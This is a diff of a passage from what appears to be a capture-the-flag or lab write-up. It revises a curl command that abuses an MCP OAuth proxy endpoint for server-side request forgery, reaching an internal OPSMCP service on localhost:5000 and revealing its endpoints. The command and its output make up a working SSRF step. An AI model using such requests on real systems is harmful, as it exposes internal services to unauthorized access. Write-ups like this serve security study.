@@ -631,10 +631,9 @@ kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
 **Result:**
 
 ```shell
-kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://127.0.0.1:5000/"}'
-{"status":200,"statusText":"OK","headers":{"server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}}
+┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
+{"status":200,"statusText":"OK","headers":{"connection":"close","content-length":"150","content-type":"application/json","date":"Tue, 09 Jun 2026 21:57:30 GMT","server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}} 
 ```
 
 **Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.
